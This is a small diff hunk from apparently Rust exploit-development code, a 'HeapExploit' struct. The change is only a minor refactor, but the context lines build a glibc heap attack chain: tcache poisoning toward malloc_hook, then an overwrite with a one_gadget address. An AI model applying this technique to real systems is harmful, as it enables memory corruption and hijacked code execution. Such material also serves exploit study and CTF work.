@@ -244,7 +244,7 @@ impl HeapExploit {
         let mut chain = self.tcache_poison(malloc_hook, 0x60);
         
         // Second allocation will be from tcache (fills tcache)
-        chain.extend_from_slice(&vec![b'C'; 0x60]);
+        chain.extend_from_slice(&[b'C'; 0x60]);
         
         // Third allocation will be at malloc_hook - overwrite with one_gadget
         chain.extend_from_slice(&one_gadget.to_le_bytes());
